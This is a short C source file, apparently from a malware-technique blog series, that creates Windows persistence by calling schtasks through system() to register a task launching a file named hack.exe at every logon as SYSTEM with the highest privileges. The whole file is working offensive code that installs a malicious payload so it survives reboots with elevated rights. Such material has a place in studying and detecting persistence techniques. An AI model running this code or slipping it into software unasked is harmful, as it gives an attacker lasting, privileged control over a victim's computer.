/*
 * pers.c
 * persistence via Scheduled Tasks
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2025/03/12/malware-pers-27.html
*/
#include <windows.h>
#include <stdio.h>

int main() {
  // task
  const char *taskName = "MeowTask";
  const char *malwarePath = "C:\\Users\\zhzhu\\Desktop\\hack.exe";
  char command[512];

  snprintf(command, sizeof(command), 
       "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /ru SYSTEM /rl highest /f",
       taskName, malwarePath);

  // run command
  int result = system(command);

  if (result == 0) {
    printf("task created successfully! :)\n");
  } else {
    printf("failed to create task. :(\n");
  }

  return 0;
}
